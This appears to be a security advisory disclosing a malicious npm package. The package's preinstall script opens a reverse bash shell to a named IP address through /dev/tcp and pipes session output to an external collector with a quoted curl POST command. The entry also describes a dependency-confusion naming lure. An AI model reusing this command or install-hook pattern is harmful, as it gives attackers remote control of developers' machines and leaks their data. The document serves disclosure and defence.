summary: preinstall reverse shell and canarytoken beacon on npm install
details: package.json declares a preinstall lifecycle script that spawns an interactive bash shell connected to 147.93.157.202:8080 via /dev/tcp, giving the operator of that endpoint interactive command execution on the installer's host during `npm install`. The same preinstall command pipes shell session output through `curl -s -m 5 -X POST --data-binary @- http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php`, sending host/output data to an external HTTP collector at install time. The package name mimics a plausible auth utility and the implausibly high version number (19999.1360.4) is consistent with a dependency-confusion lure targeting an internal package name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
